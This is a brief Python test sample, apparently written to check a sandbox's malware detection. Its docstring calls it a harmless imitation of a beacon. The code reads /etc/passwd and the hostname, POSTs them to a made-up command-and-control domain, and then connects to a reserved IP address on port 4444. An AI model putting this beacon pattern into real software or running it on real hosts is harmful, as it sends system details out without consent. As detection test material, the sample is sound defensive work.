#!/usr/bin/env python3
"""Harmless test sample (expected verdict: malicious). Imitates a beacon.

Collects trivial host details, posts them to a made-up C2 domain, then tries a
hard-coded IP from TEST-NET-3 (203.0.113.0/24, reserved and never routed).
In the sandbox all of it ends at the sinkhole or the firewall.
"""
import json
import socket
import urllib.request

with open("/etc/passwd") as f:
    info = {"host": socket.gethostname(), "accounts": len(f.read().splitlines())}
try:
    req = urllib.request.Request("http://update-check.example-c2.net/api/checkin",
                                 data=json.dumps(info).encode(), method="POST",
                                 headers={"Content-Type": "application/json"})
    urllib.request.urlopen(req, timeout=5)
except OSError:
    pass
try:
    socket.create_connection(("203.0.113.50", 4444), timeout=3)
except OSError:
    pass
